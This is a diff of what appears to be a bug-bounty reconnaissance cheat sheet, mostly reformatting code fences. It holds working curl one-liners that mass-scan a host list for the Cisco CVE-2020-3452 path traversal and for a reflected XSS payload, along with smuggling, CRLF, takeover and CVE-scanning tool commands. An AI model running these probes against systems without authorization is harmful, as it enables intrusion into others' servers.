@@ -26,25 +26,27 @@ python3 ~/tools/smuggler/smuggler.py -u "https://google.com" -m GET -q
 
 python3 ~/tools/mass-bounty/CRLF-Injection-Scanner/crlf_scan.py -i uniq.txt
 
-        * CVE-2020-3452
-        
-while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < HOSTS.txt
- 
-cat uniq.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
 
-```text
+* CVE-2020-3452
+
+```bash 
+cat uniq.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
+```
+
+```bash
 while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < HOSTS.txt
 ```
 
 subzy -targets domains -hide_fails
 
-```text
+```bash
 jaeles scan -s /root/.jaeles/base-signatures/cves/* -U domains.txt
 ```
 
 ## Heavy 
-
+```bash
 eyewitness --web -f uniq.txt -d /path_to_save_screenshots ##### optional , takes time, better grep for juicy domains and move forward
+```
 
 ```bash
 for I in $(ls); do 
